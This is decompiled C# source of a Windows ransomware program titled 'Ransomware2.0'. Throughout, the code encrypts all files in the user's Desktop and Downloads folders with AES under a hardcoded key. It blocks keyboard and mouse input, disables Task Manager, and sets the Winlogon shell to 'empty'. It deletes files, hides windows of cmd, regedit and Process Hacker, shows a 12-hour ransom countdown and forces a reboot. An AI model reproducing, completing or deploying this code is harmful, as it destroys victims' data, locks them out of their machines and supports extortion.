using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns1;

public class Ransomware2 : Form
{
	public class GClass0
	{
		public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class GClass1
	{
		public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class GClass2
	{
		public void method_0(string string_0, string string_1)
		{
			byte[] byte_ = File.ReadAllBytes(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(string_1);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = GClass0.smethod_0(byte_, bytes);
			File.WriteAllBytes(string_0, bytes2);
		}
	}

	public class GClass3
	{
		public void method_0(string string_0, string string_1)
		{
			byte[] byte_ = File.ReadAllBytes(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(string_1);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = GClass1.smethod_0(byte_, bytes);
			File.WriteAllBytes(string_0, bytes2);
		}
	}

	[CompilerGenerated]
	private sealed class Class2
	{
		public Ransomware2 ransomware2_0;

		public DateTime dateTime_0;

		internal void method_0(object sender, EventArgs e)
		{
			((Control)ransomware2_0.label2).set_Text((TimeSpan.FromHours(12.0) - (DateTime.Now - dateTime_0)).ToString("hh\\:mm\\:ss"));
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class3
	{
		public static readonly Class3 class3_0 = new Class3();

		public static Func<string, bool> func_0;

		internal bool method_0(string string_0)
		{
			return (new FileInfo(string_0).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden;
		}
	}

	private const int int_0 = 0;

	private const int int_1 = 5;

	private IContainer icontainer_0 = null;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Label lbl1;

	private Label label1;

	private TextBox codebox;

	private Button button1;

	private Label label2;

	private Label label3;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	[DllImport("User32")]
	private static extern int ShowWindow(int int_2, int int_3);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool bool_0);

	public Ransomware2()
	{
		InitializeComponent();
		((Control)label2).set_Text(TimeSpan.FromHours(12.0).ToString());
	}

	private void Ransomware2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Ransomware2_Load(object sender, EventArgs e)
	{
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		smethod_0();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from string_0 in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(string_0).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select string_0).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		DateTime dateTime_0 = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label2).set_Text((TimeSpan.FromHours(12.0) - (DateTime.Now - dateTime_0)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		timer_0.Start();
		timer_1.Start();
		timer_2.Start();
		timer_3.Start();
		timer_4.Start();
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		timer_0.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(701, 584));
		((Form)this).set_Location(new Point(500, 500));
		smethod_1();
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		timer_1.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		timer_2.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
		}
		timer_2.Start();
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		timer_3.Stop();
		smethod_2();
	}

	private void timer_4_Tick(object sender, EventArgs e)
	{
		timer_4.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("Ransomware2.0");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start("shutdown", "/r /t 0");
			process.Kill();
		}
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)codebox).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)codebox).get_Text() == "Qвспышка'Q@D#h{KYy#FG+гранулярностьуровень%h7|пределы!k'нетQ*6<усыновитель]'дешифратор$@axcLG7L[D>ao9D^epnh4Xn{глюглоу$rDYn(7LbGQ1aGZHNDMySC1QNGR6MWtsOXQz~C##{DiQ+d_головакибернетика(GgC%7&,M+небрежный|X<1ZG5HN2&Gy/t})T]B53]L|q|03am/e<X;QKn*C!mNqnS6[DJIa2RqYg")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			smethod_3();
			Process[] array = null;
			array = Process.GetProcessesByName("Rasomware2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static void smethod_0()
	{
		BlockInput(bool_0: true);
	}

	public static void smethod_1()
	{
		BlockInput(bool_0: false);
	}

	private void codebox_TextChanged(object sender, EventArgs e)
	{
	}

	private static void smethod_2()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		GClass2 gClass = new GClass2();
		string string_ = "Qвспышка'Q@D#h{KYy#FG+гранулярностьуровень%h7|пределы!k'нетQ*6<усыновитель]'дешифратор$@axcLG7L[D>ao9D^epnh4Xn{глюглоу$rDYn(7LbGQ1aGZHNDMySC1QNGR6MWtsOXQz~C##{DiQ+d_головакибернетика(GgC%7&,M+небрежный|X<1ZG5HN2&Gy/t})T]B53]L|q|03am/e<X;QKn*C!mNqnS6[DJIa2RqYg";
		for (int i = 0; i < files.Length; i++)
		{
			gClass.method_0(files[i], string_);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			gClass.method_0(files2[j], string_);
		}
	}

	private static void smethod_3()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		GClass3 gClass = new GClass3();
		string string_ = "Qвспышка'Q@D#h{KYy#FG+гранулярностьуровень%h7|пределы!k'нетQ*6<усыновитель]'дешифратор$@axcLG7L[D>ao9D^epnh4Xn{глюглоу$rDYn(7LbGQ1aGZHNDMySC1QNGR6MWtsOXQz~C##{DiQ+d_головакибернетика(GgC%7&,M+небрежный|X<1ZG5HN2&Gy/t})T]B53]L|q|03am/e<X;QKn*C!mNqnS6[DJIa2RqYg";
		for (int i = 0; i < files.Length; i++)
		{
			gClass.method_0(files[i], string_);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			gClass.method_0(files2[j], string_);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Expected O, but got Unknown
		//IL_0229: Unknown result type (might be due to invalid IL or missing references)
		//IL_0233: Expected O, but got Unknown
		//IL_02b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c3: Expected O, but got Unknown
		//IL_0363: Unknown result type (might be due to invalid IL or missing references)
		//IL_036d: Expected O, but got Unknown
		//IL_0410: Unknown result type (might be due to invalid IL or missing references)
		//IL_041a: Expected O, but got Unknown
		//IL_04dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e7: Expected O, but got Unknown
		//IL_0584: Unknown result type (might be due to invalid IL or missing references)
		//IL_058e: Expected O, but got Unknown
		//IL_07dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e6: Expected O, but got Unknown
		//IL_0827: Unknown result type (might be due to invalid IL or missing references)
		//IL_0831: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ransomware2));
		pictureBox1 = new PictureBox();
		pictureBox2 = new PictureBox();
		lbl1 = new Label();
		label1 = new Label();
		codebox = new TextBox();
		button1 = new Button();
		label2 = new Label();
		label3 = new Label();
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		timer_2 = new Timer(icontainer_0);
		timer_3 = new Timer(icontainer_0);
		timer_4 = new Timer(icontainer_0);
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_Cursor(Cursors.get_No());
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(0, 392));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(143, 155));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox2).set_Cursor(Cursors.get_No());
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(548, 391));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(138, 156));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)lbl1).set_AutoSize(true);
		((Control)lbl1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lbl1).set_ForeColor(Color.White);
		((Control)lbl1).set_Location(new Point(13, 13));
		((Control)lbl1).set_Name("lbl1");
		((Control)lbl1).set_Size(new Size(0, 25));
		((Control)lbl1).set_TabIndex(2);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Cursor(Cursors.get_Help());
		((Control)label1).set_Font(new Font("Microsoft YaHei UI", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(652, 364));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text(componentResourceManager.GetString("label1.Text"));
		label1.set_TextAlign((ContentAlignment)32);
		((Control)codebox).set_BackColor(Color.Gray);
		((Control)codebox).set_Font(new Font("Microsoft YaHei UI", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)codebox).set_Location(new Point(144, 392));
		((Control)codebox).set_Name("codebox");
		((Control)codebox).set_Size(new Size(398, 34));
		((Control)codebox).set_TabIndex(5);
		codebox.set_TextAlign((HorizontalAlignment)2);
		((Control)codebox).add_TextChanged((EventHandler)codebox_TextChanged);
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).set_FlatStyle((FlatStyle)1);
		((Control)button1).set_Font(new Font("Microsoft YaHei UI", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(144, 429));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(398, 53));
		((Control)button1).set_TabIndex(6);
		((Control)button1).set_Text("DECRYPT FILES");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Cursor(Cursors.get_No());
		((Control)label2).set_Font(new Font("Microsoft YaHei UI", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(431, 492));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(102, 28));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("00:00:00");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Cursor(Cursors.get_No());
		((Control)label3).set_Font(new Font("Microsoft YaHei UI", 24f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(144, 485));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(278, 42));
		((Control)label3).set_TabIndex(8);
		((Control)label3).set_Text("REAMING TIME:");
		timer_0.set_Enabled(true);
		timer_0.set_Interval(10000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_1.set_Enabled(true);
		timer_1.set_Interval(1000);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_2.set_Enabled(true);
		timer_2.set_Interval(300);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		timer_3.set_Enabled(true);
		timer_3.set_Interval(1000);
		timer_3.add_Tick((EventHandler)timer_3_Tick);
		timer_4.set_Enabled(true);
		timer_4.set_Interval(43200000);
		timer_4.add_Tick((EventHandler)timer_4_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(685, 546));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)codebox);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)lbl1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Ransomware2");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Ransomware2.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Ransomware2_FormClosing));
		((Form)this).add_Load((EventHandler)Ransomware2_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
